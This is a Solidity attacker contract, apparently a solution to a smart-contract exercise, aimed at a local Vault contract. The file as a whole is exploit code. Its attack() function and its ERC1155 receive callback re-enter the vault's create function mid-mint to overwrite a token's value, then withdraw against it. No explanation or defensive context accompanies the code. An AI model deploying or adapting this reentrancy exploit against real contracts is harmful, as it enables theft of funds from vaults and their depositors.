// SPDX-License-Identifier:  None
pragma solidity 0.8.20;

import "./vault.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";


contract Attacker is IERC1155Receiver  {
    
    Vault vault;

    uint256 targetId = 1000; // id start with 0

    uint256 counter = 0;

    constructor(address vaultAddress) payable{
        vault = Vault(vaultAddress);
    }

    function attack() external returns(uint256){
        uint256 id = vault.create(1, 10);
        targetId = id+1;
        uint256 retId = vault.create(1000, 1);
        require(targetId == retId, "reentrancy unsuccess");
        vault.payEth{value: 1 ether}(targetId);
        vault.withdraw(targetId); 
        return retId;
    }

    function onERC1155Received(
        address ,
        address ,
        uint256 id,
        uint256 ,
        bytes calldata 
    ) external override returns (bytes4) {
        counter++;
        if(targetId == id && counter == 2){
            uint256 updatedId = vault.create(1, 1e18);
            require(targetId == updatedId, "updated value of different token id");
        }
    
        return this.onERC1155Received.selector;
    }  

    function onERC1155BatchReceived(
        address ,
        address ,
        uint256[] calldata ,
        uint256[] calldata ,
        bytes calldata 
    ) external pure override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    receive() external payable {}

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId || 
           interfaceId == type(IERC165).interfaceId;
    }

}
